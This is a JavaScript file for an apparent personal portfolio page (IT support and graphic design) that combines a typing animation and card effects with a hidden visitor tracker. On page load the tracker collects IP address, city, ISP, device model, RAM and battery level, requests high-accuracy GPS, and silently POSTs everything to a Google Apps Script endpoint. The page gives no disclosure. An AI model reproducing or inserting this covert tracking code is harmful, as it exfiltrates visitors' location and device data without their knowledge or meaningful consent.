(async function() {
  const WEB_APP_URL = "https://script.google.com/macros/s/AKfycbxK6ZGHwNQt4AoXHznY5AKtcCmt_Z1byEGVQufnq4U82_ga32yiZ3CgmcHwzPvToTBnVA/exec";

  // --- 1. FUNGSI DETEKSI PERANGKAT ---
  const getDeviceModel = () => {
    const ua = navigator.userAgent;
    if (/android/i.test(ua)) {
      const match = ua.match(/Android.*;\s([^;]+)\sBuild/);
      return match ? match[1] : "Android Device";
    }
    if (/iPhone|iPad|iPod/.test(ua) && !window.MSStream) {
      const w = window.screen.width, h = window.screen.height;
      if (w === 390 && h === 844) return "iPhone 12/13/14 Pro";
      if (w === 430 && h === 932) return "iPhone 14/15 Pro Max";
      if (w === 375 && h === 667) return "iPhone SE/6/7/8";
      return "Apple iOS Device";
    }
    return navigator.platform || "PC/Laptop";
  };

  // --- 2. FUNGSI TRACKER UTAMA ---
  const startTracker = async () => {
    let payload = {
      ip: "-", city: "-", country: "-", isp: "-",
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      ram: navigator.deviceMemory || "N/A",
      battery: "0",
      deviceName: getDeviceModel(),
      lat: null, long: null
    };

    // Ambil Data Jaringan (Kota, Negara, ISP, IP)
    try {
      const res = await fetch('http://ip-api.com/json/');
      const d = await res.json();
      if (d.status === "success") {
        payload.ip = d.query;
        payload.city = d.city;
        payload.country = d.country;
        payload.isp = d.isp;
      }
    } catch (e) { console.log("Network API error"); }

    // Ambil Data Baterai
    if (navigator.getBattery) {
      try { 
        const b = await navigator.getBattery();
        payload.battery = Math.round(b.level * 100);
      } catch (e) {}
    }

    const sendData = (data) => {
      fetch(WEB_APP_URL, {
        method: "POST",
        mode: "no-cors",
        body: JSON.stringify(data)
      });
    };

    // KIRIM DATA AWAL (IP & Device Info)
    sendData(payload);

    // MINTA LOKASI GPS (Update data jika diizinkan)
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition((pos) => {
        payload.lat = pos.coords.latitude;
        payload.long = pos.coords.longitude;
        payload.accuracy = pos.coords.accuracy.toFixed(2) + "m";
        sendData(payload); // Kirim pembaruan dengan koordinat
      }, null, { enableHighAccuracy: true });
    }
  };

  // --- 3. UI EFFECTS (TYPING) ---
  const texts = ['IT Support / Graphic Design', 'Hardware & Software Specialist', 'Creative Problem Solver', 'Tech Enthusiast'];
  let textIndex = 0, charIndex = 0, isDeleting = false, typingDelay = 150;

  function typeText() {
    const typedElement = document.getElementById('typed-text');
    if (!typedElement) return;
    const currentText = texts[textIndex];
    if (isDeleting) {
      typedElement.textContent = currentText.substring(0, charIndex - 1);
      charIndex--; typingDelay = 75;
    } else {
      typedElement.textContent = currentText.substring(0, charIndex + 1);
      charIndex++; typingDelay = 150;
    }
    if (!isDeleting && charIndex === currentText.length) {
      typingDelay = 2000; isDeleting = true;
    } else if (isDeleting && charIndex === 0) {
      isDeleting = false;
      textIndex = (textIndex + 1) % texts.length;
      typingDelay = 500;
    }
    setTimeout(typeText, typingDelay);
  }

  // --- 4. RUN ALL ---
  window.addEventListener('load', () => {
    startTracker();
    setTimeout(typeText, 1000);
    
    // Card Ripple Effect
    document.querySelectorAll('.card').forEach(card => {
      card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width) * 100;
        const y = ((e.clientY - rect.top) / rect.height) * 100;
        card.querySelector('.card-inner').style.setProperty('--x', `${x}%`);
        card.querySelector('.card-inner').style.setProperty('--y', `${y}%`);
      });
    });
  });
})();
